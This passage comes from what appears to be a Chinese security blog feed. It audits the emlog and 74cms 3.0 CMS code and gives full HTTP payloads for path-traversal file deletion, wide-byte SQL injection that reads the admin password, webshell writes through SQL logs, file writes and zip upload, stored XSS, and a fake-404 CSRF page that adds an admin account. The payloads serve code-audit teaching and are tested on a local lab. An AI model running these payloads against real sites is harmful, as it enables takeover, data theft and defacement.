text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/blogger.php?active_del=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryVzcf6UrvpBos4Orw</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;</span><br><span class="line"></span><br><span class="line">../../info.php</span><br></pre></td></tr></table></figure><h3 id="3-通过后台数据库备份上传webshell"><a href="#3-通过后台数据库备份上传webshell" class="headerlink" title="3.通过后台数据库备份上传webshell"></a>3.通过后台数据库备份上传webshell</h3><p>对于在<code>/emlog/init.php</code> 中的变量 <code>$action</code>，当我们通过GET方式传入<code>$action[]</code>数组的形式，会出现语法错误报错导致的网站路径泄露，可以考虑结合sql注入写入webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在<code>/admin/data.php</code>中发现了可以进行本地数据库备份，并可以上传数据库备份文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么就可以考虑加入语句</p><p><code>SELECT &quot;&lt;?php phpinfo(); ?&gt;&quot; INTO outfile &quot;E:\php\PHPTutorial\WWW\emlog\shell.php&quot;;</code>如果网站数据库的配置<code>secure_file_priv</code>为空，那么我们就可以直接在网站根目录下写入webshell</p><p>我们先随意备份一个数据库文件，然后加入上述语句，上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>结果出现了报错信息<code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code>说明数据库配置<code>secure_file_priv</code>为null，并且我们无法通过SQL语句改变该配置值，在数据库中验证<code>show global variables like &#39;%secure%&#39;;</code></p><p>所以我们考虑另一种方法，通过设置SQL日志的方式，首先需要保证<code>general_log=on</code>，再修改<code>general_log_file</code>的日志写入文件绝对路径</p><p>在数据库文件中加入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log = &apos;on&apos;;</span><br><span class="line">SET GLOBAL general_log_file = &apos;E:/php/PHPTutorial/WWW/emlog/shell.php&apos;;</span><br><span class="line">SELECT &apos;&lt;?php phpinfo(); ?&gt;&apos;;</span><br></pre></td></tr></table></figure><p>然后上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出显示了上传成功</p><p>然后我们可以看到在网站的根目录下出现了<code>shell.php</code>即我们上传的webshell，它实际上是一个日志文件，只不过我们加入了可执行的Php代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="4-通过上传ZIP文件上传webshell"><a href="#4-通过上传ZIP文件上传webshell" class="headerlink" title="4.通过上传ZIP文件上传webshell"></a>4.通过上传ZIP文件上传webshell</h3><p><code>/admin/plugin.php</code>页面可以上传一个zip压缩包，并在后台将压缩包解压成文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>跟踪<code>emUnZip()</code>函数，在<code>/include/lib/function.base.php</code>下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>图中有我自己添加的测试代码，用来测试<code>ZipArchive</code>类的<code>getNameIndex</code>和<code>getFromName</code>函数的输出值</p><p>我们试着上传一个test.zip，压缩包中包含demo文件夹，demo文件夹下包含demo.php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出这里<code>getNameIndex()</code>函数返回结果是压缩包下的文件夹名即<code>demo/</code>，在768行中<code>$dir . $plugin_name . &#39;.php&#39;</code>拼接的结果是<code>demo/demo.php</code>即压缩包下的目录内容，从响应包结果来看是上传成功的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以猜出<code>getFromName</code>函数应该是判断压缩包下的文件目录如果与传入的参数一致，则返回true，所以可以看出我们上传的文件夹名必须和文件名是相同的，后面即可解压压缩包，上传webshell</p><p>如果我们上传的压缩包只包含一个php文件，可以看一下测试的响应结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么<code>$dir . $plugin_name . &#39;.php&#39;</code>拼接的结果是<code>demo.php/demo.php.php</code>，从响应结果<code>Location: ./plugin.php?error_e=1</code>来看很明显是上传失败，返回-1，说明是<code>$re == false</code>导致的，即<code>getFromName</code>函数判断压缩包不存在该目录</p><h3 id="5-存储型XSS"><a href="#5-存储型XSS" class="headerlink" title="5.存储型XSS"></a>5.存储型XSS</h3><p><code>/admin/write_log.php</code>添加文章存在html代码形式，尝试直接添加<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>添加后访问网站首页出现弹框</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>抓包分析</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>跟踪到<code>/admin/save_log.php</code>文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p><code>$content</code>变量只有经过转义处理，还是过滤不当引起的xss</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该CMS较小，代码简洁易懂，大部分的漏洞，由于全局不存在输入过滤，所以通过全局搜索POST，GET数据发现的，还是那句话，输入过滤不够，导致的漏洞</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--74cms3.0</title>
    <link href="https://Foxgrin.github.io//posts/5451/"/>
    <id>https://Foxgrin.github.io//posts/5451/</id>
    <published>2019-03-18T12:15:00.000Z</published>
    <updated>2019-03-20T12:12:36.692Z</updated>
    
    <content type="html"><![CDATA[<p>记录74cms3.0审计过程以及漏洞分析<a id="more"></a></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>先进入根目录的<code>index.php</code>，跟进包含的头文件<code>/include/common.inc.php</code>，该文件又包含了三个文件，其中<code>/data/config.php</code>和<code>/include/74cms_version.php</code>为网站配置和版本文件，无需关心。<code>/include/common.fun.php</code>为函数文件。继续往下审计，发现21-30行对输入数据进行了过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET))</span><br><span class="line">&#123;</span><br><span class="line">$_GET  = addslashes_deep($_GET);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</span><br><span class="line">&#123;</span><br><span class="line">$_POST = addslashes_deep($_POST);</span><br><span class="line">&#125;</span><br><span class="line">$_COOKIE   = addslashes_deep($_COOKIE);</span><br><span class="line">$_REQUEST  = addslashes_deep($_REQUEST);</span><br></pre></td></tr></table></figure><p>在<code>/include/common.fun.php</code>跟踪<code>addslashes_deep</code>函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>过滤总结起来就是对<code>$_GET $_POST $_COOKIE $_REQUEST</code>数据都进行单引号双引号的转义，以及过滤标签的处理</p><p>GET,POST,COOKIE都有过滤，那么IP字段有没有过滤呢，按照之前审计都有一个<code>getip()</code>函数来获取头部的IP字段，果然在101行发现该函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是这里进行了正则匹配过滤出格式合法的IP值，所以我们无法利用IP字段</p><p>也就是说，在后面的审计过程中，只要发现文件包含了<code>/include/common.inc.php</code>，那么就无法通过注入标签进行XSS攻击，以及限制了SQL注入，但是，我们注意配置文件<code>/include/mysql.class.php</code>中的第29行设置了数据库的编码方式为<code>GBK</code>，所以在有单引号或双引号包裹的情况下是可以考虑进行<strong>宽字节注入</strong>的</p><p>类似于前台，<code>/admin/</code>后台的文件头部也包含了<code>/admin/include/admin_common.inc.php</code>，过滤如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = admin_addslashes_deep($_POST);</span><br><span class="line">$_GET = admin_addslashes_deep($_GET);</span><br><span class="line">$_COOKIE = admin_addslashes_deep($_COOKIE);</span><br><span class="line">$_REQUEST = admin_addslashes_deep($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>admin_addslashes_deep</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_addslashes_deep</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'admin_addslashes_deep'</span>, $value) : addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现后台对于客户端提交的数据只有转义的处理，是不会过滤掉标签的</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-任意文件删除漏洞"><a href="#1-任意文件删除漏洞" class="headerlink" title="1.任意文件删除漏洞"></a>1.任意文件删除漏洞</h3><p><code>/admin/admin_article.php</code>第151-152行中存在可利用变量<code>$_GET[&#39;img&#39;]</code>导致任意文件删除漏洞</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在全局分析中，我们知道，后台对<code>$_GET</code>只有转义的处理，所以我们构造路径穿越进行删除文件</p><p>payload：<code>?act=del_img&amp;img=../../info.php</code></p><h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p><code>/user/user_personal.php</code>第947-951行存在可利用变量<code>$setsqlarr</code>导致SQL注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以注意到这里的数组变量<code>$setsqlarr</code>中的各个属性变量都只有转义的处理就拼接到SQL语句中，这是一个用户基本信息保存的功能代码，当查询不到<code>$SESSION[&#39;uid&#39;]</code>即未保存过信息时，会使用<code>INSERT</code>语句。反之则使用<code>UPDATE</code>语句，然后将保存的个人信息渲染到html页面中，跟踪一下<code>updatetable()</code>函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>了解语句后，我们先保存一个个人信息</p><p>之后再进行修改操作，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/user/user_personal.php?act=userprofile_save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 193</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/user/user_personal.php?act=userprofile</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=1; QS[username]=user01; QS[password]=f9b56fc246a5142ad76408997edc1e4d; QS[utype]=2; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">realname=123&amp;sex=%C4%D0&amp;birthday=111111&amp;addresses=12312332&amp;mobile=18912345678&amp;phone=254221&amp;qq=12345&amp;msn=123%df&apos;,`profile`=(select pwd from 74_admin) where uid=1#&amp;profile=123&amp;Submit=%B1%A3%B4%E6</span><br></pre></td></tr></table></figure><p>拼接后的sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="number">74</span>cms_members_info <span class="keyword">SET</span> <span class="string">`realname`</span>=<span class="string">'123'</span>, <span class="string">`sex`</span>=<span class="string">'男'</span>, <span class="string">`birthday`</span>=<span class="string">'111111'</span>, <span class="string">`addresses`</span>=<span class="string">'12312332'</span>, <span class="string">`mobile`</span>=<span class="string">'18912345678'</span>, <span class="string">`phone`</span>=<span class="string">'254221'</span>, <span class="string">`qq`</span>=<span class="string">'12345'</span>, <span class="string">`msn`</span>=<span class="string">'123�\\\',`profile`=database() where uid=1#'</span>, <span class="string">`profile`</span>=<span class="string">'123'</span> <span class="keyword">WHERE</span>  uid=<span class="string">'1'</span><span class="string">`</span></span><br></pre></td></tr></table></figure><p>执行后<code>profile</code>字段显示的值就是数据库名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>另外<code>/user/user_company_points.php</code>第861行同样存在可利用变量<code>$setsqlarr</code>，导致SQL注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/user/user_company_points.php?act=company_profile_save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 416</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/user/user_company_points.php?act=company_profile</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=2; QS[username]=user02; QS[password]=fd14a8ceb080688b964f9f89a66a730d; QS[utype]=1; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">companyname=1234&amp;nature_cn=%B9%FA%C6%F3&amp;nature=46&amp;trade_cn=%BC%C6%CB%E3%BB%FA%C8%ED%BC%FE%2F%D3%B2%BC%FE&amp;trade=1&amp;district_cn=%B5%D8%C7%F81+%2F+%B5%D8%C7%F81%D7%D3%C0%E0&amp;district=1&amp;sdistrict=2&amp;scale_cn=20%C8%CB%D2%D4%CF%C2&amp;scale=80&amp;registered=123&amp;currency=%C8%CB%C3%F1%B1%D2&amp;contact=123&amp;telephone=1234567&amp;email=123%40123.com&amp;website=%df&apos;,`contents`=database() where uid=2#&amp;address=123&amp;contents=123&amp;Submit=%B1%A3%B4%E6</span><br></pre></td></tr></table></figure><p>该cms存在多处<code>$setsqlarr</code>都可以利用，不止以上两个，不一一列举</p><h3 id="3-任意文件写入漏洞"><a href="#3-任意文件写入漏洞" class="headerlink" title="3.任意文件写入漏洞"></a>3.任意文件写入漏洞</h3><p><code>/admin/admin_templates.php</code>第125行<code>fwrite()</code>函数中存在可利用变量<code>$handle</code>和<code>$tpl_content</code>，导致任意文件写入漏洞</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在全局分析中，我们已经知道后台对我们提交的数据只有转义处理，所以我们可以很容易的写入一个webshell，payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/admin/admin_templates.php?act=do_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=1; QS[username]=user01; QS[password]=f9b56fc246a5142ad76408997edc1e4d; QS[utype]=2; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 61</span><br><span class="line"></span><br><span class="line">tpl_dir=../&amp;tpl_name=info.php&amp;tpl_content=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行完成后在网站根目录下写入一个webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="4-存储型XSS漏洞"><a href="#4-存储型XSS漏洞" class="headerlink" title="4.存储型XSS漏洞"></a>4.存储型XSS漏洞</h3><p><code>/link/add_link.php</code>第36行存在可利用变量<code>$_POST[&#39;link_logo&#39;]</code>在<code>/admin/admin_link.php</code>中将该变量渲染到<code>/admin/templates/default/link/admin_link.htm</code>的<code>&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src= border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;</code>中，存在存储型XSS漏洞</p><p><code>/link/add_link.php</code>对添加的链接信息数组<code>$setsqlarr</code>有转义加去标签的处理</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后<code>/admin/admin_link.php</code>中<code>get_links()</code>函数将添加的链接信息从数据库中取出渲染到前台页面中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们跟进<code>link/admin_link.htm</code></p><p>在第58行中<code>&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src= border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;</code>我们可以看到前台将<code>link_logo</code>这以变量值作为<code>img</code>标签的读取源，虽然有去标签的处理，但是这里我们不需要加入标签，利用<strong>onerror</strong>事件也可以进行XSS攻击</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/link/add_link.php?act=save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 117</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/link/add_link.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=2; QS[username]=user02; QS[password]=fd14a8ceb080688b964f9f89a66a730d; QS[utype]=1; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">alias=QS_index&amp;link_name=123&amp;link_url=123&amp;link_logo=%23+onerror%3Dalert%28%2Fxss%2F%29&amp;app_notes=&amp;Submit=%CC%E1%BD%BB</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行成功后，在页面每次将鼠标移动至<strong>[logo]</strong>处都会弹框</p><h3 id="5-CSRF漏洞"><a href="#5-CSRF漏洞" class="headerlink" title="5.CSRF漏洞"></a>5.CSRF漏洞</h3><p><code>/admin/admin_users.php</code>第42-68行由于未加入token验证，可以造成CSRF漏洞任意添加管理员账号</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/74cms/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>攻击过程：构造一个虚假404页面诱导管理员点击，页面代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /info.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span>  <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  xmldata = <span class="string">'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3'</span>;</span></span><br><span class="line"><span class="javascript">      xmlhttp.open(<span class="string">'POST'</span>,<span class="string">'http://127.0.0.1/74cms/admin/admin_users.php?act=add_users_save'</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">            xmlhttp.setRequestHeader(<span class="string">'Content-Type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span></span><br><span class="line"><span class="javascript">            xmlhttp.withCredentials=<span class="string">'true'</span>; </span></span><br><span class="line"><span class="undefined">            xmlhttp.send(xmldata);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        add();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 